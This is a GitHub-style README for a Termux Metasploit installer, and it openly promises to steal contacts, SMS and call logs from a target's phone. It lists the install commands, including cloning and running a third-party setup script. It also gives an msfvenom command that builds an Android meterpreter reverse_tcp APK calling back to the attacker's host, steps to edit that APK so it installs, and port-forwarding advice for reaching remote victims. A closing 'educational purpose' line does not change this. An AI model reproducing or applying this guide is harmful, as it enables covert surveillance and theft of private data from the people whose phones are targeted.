# metasploit
This tool will help you to steal contacts, sms, call logs and other thing of Target Mobile.
<p align="center"><img src="https://spportcovid19patient.000webhostapp.com/metasploit-696x363.png"></p>

<p align="center">
<img src="https://img.shields.io/badge/Python-3-brightgreen.svg?style=plastic">
<img src="https://img.shields.io/badge/Docker-✔-blue.svg?style=plastic">
</p>

<p align="center">
  <a href="https://twitter.com/jeopardy4u"><b>Twitter</b></a>
  <span> - </span>
  <a href="https://instagram.com/loathfaith"><b>Instagram</b></a>
  <span> - </span>
  <a href="https://github.com/loathsomeguy"><b>Tej's Page</b></a>
</p>

## Installation

### Termux

```bashapt update && upgrade
termux-setup-storage
pkg update && pkg upgrade -y
apt-get install curl
apt-get install wget
apt-get install git
apt install ruby
apt install pg_ctl
git clone https://github.com/loathsomeguy/Termux-Metasploit
cd Termux-Metasploit
bash setup

and press y when ask to press
```
## After installation complete
run `msfconsole`
```bash
msfconsole
```
## cmd to generate payload
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.29.29 LPORT=6767 R > /sdcard/payload.apk
```

## What will be my LHOST & LPORT?
```
LHOST: your local ip of wifi/mobile network

LPORT: you can use any port
```
## Payload Not installing, There was a problem parsing the package?
```
1. Install apk editor pro in your mobile
2. Open Apk Editor Pro and "select an apk fiel and choose your payload"
3. Click "FULL EDIT (Resource Re-Build)"
4. Select Manifest in bottom right corner
5. Now Search for SDK and change target sdk version to 22
6. Now save and again save to rebuild the apk
7. Go to APK Editor Pro folder and install that File

```
## How it is useful?

* It is used to retrieve all the messages, contacts, call-logs from the Target Mobile on the same or different Network. However you need to learn how to do port-forwarding in order to do it on different network.

## Warning
***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
